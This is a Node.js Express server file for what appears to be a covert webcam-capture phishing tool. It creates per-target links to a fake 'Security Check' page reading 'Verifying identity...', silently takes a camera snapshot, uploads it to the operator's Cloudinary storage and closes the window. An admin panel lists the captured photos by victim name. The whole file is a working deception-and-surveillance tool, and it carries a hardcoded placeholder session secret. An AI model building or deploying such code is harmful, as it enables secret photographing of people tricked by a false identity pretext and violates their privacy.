require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const { v4: uuidv4 } = require('uuid');
const cloudinary = require('cloudinary').v2;
const session = require('express-session');

const app = express();

// Cloudinary config
cloudinary.config({
  cloud_name: process.env.CLOUD_NAME,
  api_key: process.env.CLOUD_API_KEY,
  api_secret: process.env.CLOUD_API_SECRET
});

app.set('view engine', 'ejs');
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// Sessions for admin auth
app.use(session({
  secret: 'change_this_secret',
  resave: false,
  saveUninitialized: true
}));

// Memory store for generated links & images
let generatedLinks = {};

// Multer: store uploads in memory (we immediately send to Cloudinary)
const upload = multer({ storage: multer.memoryStorage() });

// Auth middleware
function requireLogin(req, res, next) {
  if (req.session && req.session.loggedIn) return next();
  res.redirect('/login');
}

// Routes
app.get('/', (req, res) => res.render('index'));

app.post('/generate-link', (req, res) => {
  const userName = (req.body.userName || '').trim();
  if (!userName) return res.redirect('/');
  const linkId = uuidv4();
  generatedLinks[linkId] = {
    userName,
    accessed: false,
    timestamp: new Date().toISOString(),
    images: []
  };
  res.redirect(`/camera/${linkId}`);
});

app.get('/camera/:linkId', (req, res) => {
  const { linkId } = req.params;
  const s = generatedLinks[linkId];
  if (!s) return res.status(404).send('Link not found');
  if (s.accessed && !req.query.allowReuse) {
    return res.send('<h2>Access Denied</h2><p>This link has already been used.</p>');
  }
  s.accessed = true;

  res.send(`<!DOCTYPE html>
  <html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Security Check</title>
    <style>
      body { font-family: Arial; text-align: center; margin: 0; padding: 20px; }
      video { width: 100%; max-width: 600px; border: 1px solid #ccc; border-radius: 8px; }
    </style>
  </head>
  <body>
    <h1>Verifying identity...</h1>
    <video id="video" autoplay playsinline></video>
    <script>
      (async () => {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.getElementById('video');
          video.srcObject = stream;
          setTimeout(() => {
            const c = document.createElement('canvas');
            c.width = video.videoWidth || 640;
            c.height = video.videoHeight || 480;
            c.getContext('2d').drawImage(video, 0, 0);
            const data = c.toDataURL('image/jpeg');
            fetch('/upload-photo', {
              method: 'POST',
              headers: { 'X-Session-ID': '${linkId}', 'Content-Type': 'application/json' },
              body: JSON.stringify({ imageData: data, timestamp: new Date().toISOString() })
            }).finally(() => {
              stream.getTracks().forEach(t => t.stop());
              window.close();
            });
          }, 1500);
        } catch (e) {
          document.body.innerHTML = '<h2>Camera access denied.</h2>';
        }
      })();
    </script>
  </body>
  </html>`);
});

app.post('/upload-photo', (req, res) => {
  const sessionId = req.headers['x-session-id'];
  const s = generatedLinks[sessionId];
  if (!s) return res.status(404).json({ error: 'Invalid session' });

  const base64 = (req.body.imageData || '').split(',')[1];
  if (!base64) return res.status(400).json({ error: 'No image data' });

  const buffer = Buffer.from(base64, 'base64');
  cloudinary.uploader.upload_stream({ folder: 'camera-captures' }, (error, result) => {
    if (error) return res.status(500).json({ error: 'Upload failed' });
    s.images.push({ url: result.secure_url, public_id: result.public_id, timestamp: req.body.timestamp });
    res.json({ success: true });
  }).end(buffer);
});

// Admin auth routes
app.get('/login', (req, res) => res.render('admin_login'));
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (username === process.env.ADMIN_USER && password === process.env.ADMIN_PASS) {
    req.session.loggedIn = true;
    res.redirect('/admin/panel');
  } else {
    res.send('<h2>Invalid credentials</h2><a href="/login">Try again</a>');
  }
});

// Admin pages
app.get('/admin/panel', requireLogin, (req, res) => res.render('admin_panel', { sessions: generatedLinks }));

app.get('/show-captures/:sessionId', requireLogin, (req, res) => {
  const s = generatedLinks[req.params.sessionId];
  if (!s) return res.status(404).send('Session not found');
  let html = `<h1>Captures for ${s.userName}</h1>`;
  s.images.forEach(img => html += `<div><img src="${img.url}" width="400" /></div>`);
  res.send(html);
});

app.delete('/delete-session/:sessionId', requireLogin, (req, res) => {
  const s = generatedLinks[req.params.sessionId];
  if (!s) return res.status(404).json({ success: false });
  s.images.forEach(img => cloudinary.uploader.destroy(img.public_id, () => {}));
  delete generatedLinks[req.params.sessionId];
  res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Server running on port ' + PORT));
